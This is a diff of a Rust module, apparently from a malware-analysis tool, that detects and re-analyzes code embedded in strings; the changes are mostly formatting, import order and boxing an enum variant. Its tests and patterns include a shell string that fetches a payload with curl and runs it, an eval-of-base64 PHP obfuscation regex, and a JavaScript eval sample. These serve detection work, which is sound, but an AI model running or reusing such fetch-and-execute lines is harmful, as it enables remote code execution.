@@ -4,11 +4,11 @@
 //! Detects Python, JavaScript, Shell, and PHP code in strings and re-analyzes them with full
 //! AST parsing and capability detection.
 
-use crate::analyzers::{FileType, unified::UnifiedSourceAnalyzer};
+use crate::analyzers::{unified::UnifiedSourceAnalyzer, FileType};
 use crate::capabilities::CapabilityMapper;
 use crate::types::binary::StringInfo;
-use crate::types::Evidence;
 use crate::types::file_analysis::{encode_decoded_path, FileAnalysis};
+use crate::types::Evidence;
 use crate::types::{Criticality, Finding};
 use anyhow::{Context, Result};
 use std::path::Path;
@@ -183,9 +183,9 @@ fn detect_php(value: &str) -> bool {
 
     // Only use fallback patterns if we see PHP-specific patterns (multiple matches required)
     let patterns = [
-        r"\$\w+\s*=",  // PHP variables always start with $
-        r"\beval\s*\(\s*base64_decode",  // Common PHP obfuscation
-        r"function\s+\w+\s*\([^)]*\)\s*\{[^}]*\$",  // PHP function with $ variable
+        r"\$\w+\s*=",                              // PHP variables always start with $
+        r"\beval\s*\(\s*base64_decode",            // Common PHP obfuscation
+        r"function\s+\w+\s*\([^)]*\)\s*\{[^}]*\$", // PHP function with $ variable
     ];
 
     let mut matches = 0;
@@ -247,21 +247,25 @@ fn generate_language_trait(
     let (trait_id, criticality) = if encoding_chain.is_empty() {
         // Plain embedded code - notable
         (
-            format!("meta/lang/embedded::{}", lang_name(&detected_lang)),
+            format!("meta/lang/embedded::{}", lang_name(detected_lang)),
             Criticality::Notable,
         )
     } else {
         // Encoded code - suspicious (obfuscation attempt)
         let encoding = &encoding_chain[0];
         (
-            format!("meta/lang/encoded/{}::{}", encoding, lang_name(&detected_lang)),
+            format!(
+                "meta/lang/encoded/{}::{}",
+                encoding,
+                lang_name(detected_lang)
+            ),
             Criticality::Suspicious,
         )
     };
 
     let description = format!(
         "{} code {} in string",
-        lang_name(&detected_lang),
+        lang_name(detected_lang),
         if encoding_chain.is_empty() {
             "embedded"
         } else {
@@ -281,7 +285,11 @@ fn generate_language_trait(
         evidence: vec![Evidence {
             method: "embedded-code-detection".to_string(),
             source: "string-analysis".to_string(),
-            value: format!("Detected {} at offset {:#x}", lang_name(&detected_lang), offset),
+            value: format!(
+                "Detected {} at offset {:#x}",
+                lang_name(detected_lang),
+                offset
+            ),
             location: Some(format!("{:#x}", offset)),
         }],
     }
@@ -290,7 +298,7 @@ fn generate_language_trait(
 /// Result of analyzing an embedded string
 pub enum EmbeddedAnalysisResult {
     /// Encoded code - becomes a separate layer (FileAnalysis)
-    EncodedLayer(FileAnalysis),
+    EncodedLayer(Box<FileAnalysis>),
     /// Plain embedded code - findings added to parent
     PlainEmbedded(Vec<Finding>),
 }
@@ -356,7 +364,7 @@ pub fn analyze_embedded_string(
         }
 
         file_entry.compute_summary();
-        Ok(EmbeddedAnalysisResult::EncodedLayer(file_entry))
+        Ok(EmbeddedAnalysisResult::EncodedLayer(Box::new(file_entry)))
     } else {
         // Plain embedded code - return findings for parent
         let mut findings = report.findings;
@@ -413,7 +421,7 @@ pub fn process_all_strings(
             Ok(EmbeddedAnalysisResult::EncodedLayer(file_analysis)) => {
                 total_bytes += string_info.value.len();
                 total_analyzed += 1;
-                encoded_layers.push(file_analysis);
+                encoded_layers.push(*file_analysis);
             }
             Ok(EmbeddedAnalysisResult::PlainEmbedded(findings)) => {
                 total_bytes += string_info.value.len();
@@ -444,14 +452,16 @@ mod tests {
     #[test]
     fn test_detect_javascript() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
-        let code = "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
+        let code =
+            "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
         assert_eq!(detect_language(code, false), Some(FileType::JavaScript));
     }
 
     #[test]
     fn test_detect_shell() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
-        let code = "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
+        let code =
+            "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
         assert_eq!(detect_language(code, false), Some(FileType::Shell));
     }
 
@@ -470,13 +480,13 @@ mod tests {
 
     #[test]
     fn test_reject_too_small() {
-        let code = "import os";  // Less than MIN_PLAIN_SIZE
+        let code = "import os"; // Less than MIN_PLAIN_SIZE
         assert_eq!(detect_language(code, false), None);
     }
 
     #[test]
     fn test_encoded_lower_threshold() {
-        let code = "import os\ndef main():\n    pass";  // Only 1 match
+        let code = "import os\ndef main():\n    pass"; // Only 1 match
         assert_eq!(detect_language(code, true), Some(FileType::Python));
     }
 
